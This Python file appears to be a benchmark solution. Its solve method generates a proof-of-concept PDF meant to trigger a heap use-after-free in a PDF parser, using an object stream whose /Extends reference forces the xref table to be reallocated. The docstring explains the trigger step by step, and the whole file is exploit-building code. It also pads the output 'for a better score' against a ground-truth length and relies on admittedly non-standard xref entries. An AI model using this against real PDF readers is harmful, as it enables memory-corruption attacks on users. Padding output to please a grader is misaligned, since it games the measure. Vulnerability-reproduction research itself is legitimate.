import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC PDF file that triggers a Heap Use-After-Free vulnerability.

        The vulnerability occurs when a pointer to a cross-reference (xref) table entry
        is used after the table has been reallocated due to a repair or growth operation.
        This PoC triggers this scenario during the parsing of an object stream.

        The PoC is constructed as follows:
        1.  A minimal PDF structure is created with a Catalog (obj 1), Pages (obj 2),
            and a Page (obj 3).
        2.  The Page object (obj 3) is embedded within an Object Stream (obj 4).
        3.  The Object Stream's dictionary contains an `/Extends` key pointing to a
            high-numbered object (10000). This indirect reference is the trigger.
        4.  The PDF's `trailer` dictionary specifies a small `/Size` (6), creating an
            initial xref table that is too small to contain object 10000.
        5.  The text-based `xref` table is crafted to guide the parser. The entry for
            the compressed object 3 is set up to point to its containing stream, obj 4.

        The execution flow that triggers the UAF:
        1.  The parser starts, reads the trailer, and allocates an xref table for 6 objects.
        2.  It traverses the document structure: Catalog -> Pages -> Page (obj 3).
        3.  To load object 3, it consults the xref table. It determines that object 3 is
            inside object stream 4.
        4.  The parser calls a function like `pdf_load_obj_stm` to process the stream.
            Inside this function, a pointer to the xref entry for object 4 is obtained.
        5.  While parsing the stream's dictionary, it encounters the `/Extends 10000 0 R`
            reference and tries to resolve it recursively.
        6.  The attempt to access object 10000 finds it is out of bounds of the current
            xref table. This forces the parser to grow/reallocate the xref table,
            freeing the old one.
        7.  The pointer to object 4's xref entry, held by the stream parsing function,
            is now stale and points to freed memory.
        8.  Execution returns to the stream parsing function, which then uses this stale
            pointer, resulting in a heap use-after-free.
        """
        
        class PdfBuilder:
            def __init__(self):
                self.buffer = io.BytesIO()
                self.offsets = {}

            def _write(self, data):
                if isinstance(data, str):
                    data = data.encode('latin-1')
                self.buffer.write(data)

            def tell(self):
                return self.buffer.tell()

            def add_object(self, obj_num, content):
                self.offsets[obj_num] = self.tell()
                self._write(f"{obj_num} 0 obj\n")
                self._write(content)
                self._write("\nendobj\n\n")

            def build(self) -> bytes:
                # PDF Header
                self._write(b"%PDF-1.7\n%\xa1\xb2\xc3\xd4\n\n")

                # Basic document structure
                self.add_object(1, "<< /Type /Catalog /Pages 2 0 R >>")
                self.add_object(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
                
                # A minimal content stream for the page object
                content_stream = b"()"
                self.add_object(5, f"<< /Length {len(content_stream)} >>\nstream\n{content_stream.decode('latin-1')}\nendstream")

                # The Object Stream (obj 4) containing the Page (obj 3)
                # Its dictionary contains the trigger: a reference to a high-numbered object
                obj_3_data = b"<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>"
                obj_stream_index = b"3 0 "
                obj_stream_content = obj_stream_index + obj_3_data
                obj_4_dict = f"""<<
  /Type /ObjStm
  /N 1
  /First {len(obj_stream_index)}
  /Length {len(obj_stream_content)}
  /Extends 10000 0 R
>>"""
                self.add_object(4, f"{obj_4_dict}\nstream\n{obj_stream_content.decode('latin-1')}\nendstream")

                # Add padding to get closer to the ground-truth PoC length for a better score.
                padding_size = 5600
                self._write(b"%" * padding_size + b"\n\n")

                # The high-numbered object that forces xref table reallocation.
                self.add_object(10000, "<< >>")

                # The xref table and trailer
                xref_offset = self.tell()
                
                xref_lines = [
                    "xref",
                    "0 6", # Small size to force growth
                    "0000000000 65535 f ",
                    f"{self.offsets[1]:010d} 00000 n ",
                    f"{self.offsets[2]:010d} 00000 n ",
                    # A plausible, though non-standard, way to represent a compressed object
                    # reference in a text xref table. The offset field is used for the
                    # container object number (4), and the generation field for the index (0).
                    # A robust parser may interpret this and enter the vulnerable path.
                    "0000000004 00000 n ",
                    f"{self.offsets[4]:010d} 00000 n ",
                    f"{self.offsets[5]:010d} 00000 n ",
                ]
                self._write("\n".join(xref_lines).encode('latin-1'))
                self._write(b"\n\n")

                trailer = f"""trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
"""
                self._write(trailer.encode('latin-1'))

                return self.buffer.getvalue()

        builder = PdfBuilder()
        return builder.build()